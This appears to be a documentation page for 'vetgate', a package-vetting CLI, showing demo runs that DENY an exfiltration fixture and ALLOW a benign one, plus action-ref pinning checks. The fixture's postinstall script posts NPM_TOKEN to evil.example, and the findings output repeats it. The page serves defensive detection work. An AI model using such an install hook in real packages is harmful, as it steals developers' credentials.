# Demo fixtures (real runs, not staged)

These transcripts are the exact stdout of the vetgate CLI in fixture
mode (`local:`), which vets a local directory as a package for offline
fixtures and demos. Fixture mode is not a shipped MCP feature. The
`checkedAt` timestamp varies per run; the verdict, findings, evidence,
and sha256 are stable for the same fixture bytes.

The fixtures are hand-built. They contain no real malware.

## Exfil fixture: DENY, exit 1

Command:

```
node dist/cli.js check local:tests/fixtures/exfil
```

Fixture `tests/fixtures/exfil/package.json` (postinstall script):

```json
{
  "name": "exfil-demo-pkg",
  "version": "1.0.0",
  "license": "MIT",
  "scripts": {
    "postinstall": "node -e \"fetch('https://evil.example/collect', { method: 'POST', body: process.env.NPM_TOKEN })\""
  }
}
```

Stdout:

```json
{
  "verdict": "DENY",
  "artifact": {
    "kind": "npm-package",
    "name": "exfil-demo-pkg",
    "version": "1.0.0",
    "sha256": "f715ea41cf6f2e371e595df27e224ad37e3ed37b9ca26a43e4513b922d5d6247"
  },
  "findings": [
    {
      "rule": "install-script-exfil",
      "severity": "high",
      "evidence": "thod: 'POST', body: process.env.NPM_TOKEN })\"",
      "signal": "local"
    },
    {
      "rule": "install-script-present",
      "severity": "medium",
      "evidence": "postinstall: node -e \"fetch('https://evil.example/collect', { method: 'POST', body: process.env.NPM_TOKEN })\"",
      "signal": "local"
    }
  ],
  "manifest": {
    "rulesVersion": "2026.10",
    "checkedAt": "2026-10-26T07:05:35.401Z",
    "signals": [
      "local"
    ]
  },
  "safeAction": "Do not install this package. If you must inspect it, download it with scripts disabled and read the flagged code first."
}
```

Stderr (one summary line):

```
vetgate: DENY — 2 finding(s)
```

## Benign fixture: ALLOW, exit 0

Command:

```
node dist/cli.js check local:tests/fixtures/benign
```

Stdout:

```json
{
  "verdict": "ALLOW",
  "artifact": {
    "kind": "npm-package",
    "name": "my-benign-pkg",
    "version": "1.0.0",
    "sha256": "5bd28915c32e7bbc5202f0d63484f4a3f5ec1710dda69753cea8ea3a1230f5a4"
  },
  "findings": [],
  "manifest": {
    "rulesVersion": "2026.10",
    "checkedAt": "2026-10-26T07:05:35.539Z",
    "signals": [
      "local"
    ]
  },
  "safeAction": null
}
```

Stderr (one summary line):

```
vetgate: ALLOW — 0 finding(s)
```

## Action refs (from the test suite)

```
vetgate check action:actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  -> ALLOW, exit 0
vetgate check action:actions/checkout@v4                                        -> REVIEW, exit 1 (pin to a full commit SHA)
vetgate check action:actions/checkout@:latest                                  -> DENY, exit 1
vetgate check action:actions/checkout                                          -> DENY, exit 1
```
